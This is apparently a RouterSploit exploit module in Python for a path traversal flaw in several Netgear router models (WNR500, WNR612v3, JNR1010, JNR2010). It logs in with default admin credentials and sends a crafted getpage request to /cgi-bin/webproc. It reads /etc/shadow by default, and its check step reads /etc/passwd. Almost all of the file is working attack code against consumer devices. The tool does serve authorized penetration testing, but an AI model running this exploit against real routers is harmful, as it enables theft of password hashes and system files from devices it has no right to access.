from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netgear WNR500/WNR612v3/JNR1010/JNR2010 Path Traversal",
        "description": "Module exploits Netgear WNR500/WNR612v3/JNR1010/JNR2010 Path Traversal "
                       "vulnerability which allows to read any file on the system.",
        "authors": (
            "Todor Donev <todor.donev[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40737/",
        ),
        "devices": (
            "Netgear WNR500",
            "Netgear WNR612v3",
            "Netgear JNR1010",
            "Netgear JNR2010",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("admin", "Username to log in")
    password = OptString("password", "Password to log in")

    filename = OptString("/etc/shadow", "File to read")

    def run(self):
        if self.check():
            path = "/cgi-bin/webproc?getpage={}&errorpage=html/main.html&var:language=en_us" \
                   "&var:language=en_us&var:page=BAS_bpa".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path,
                auth=(self.username, self.password)
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        path = "/cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html" \
               "&var:language=en_us&var:language=en_us&var:page=BAS_bpa"

        response = self.http_request(
            method="GET",
            path=path,
            auth=(self.username, self.password)
        )
        if response is None:
            return False  # target is not vulnerable

        if utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target vulnerable

        return False  # target is not vulnerable
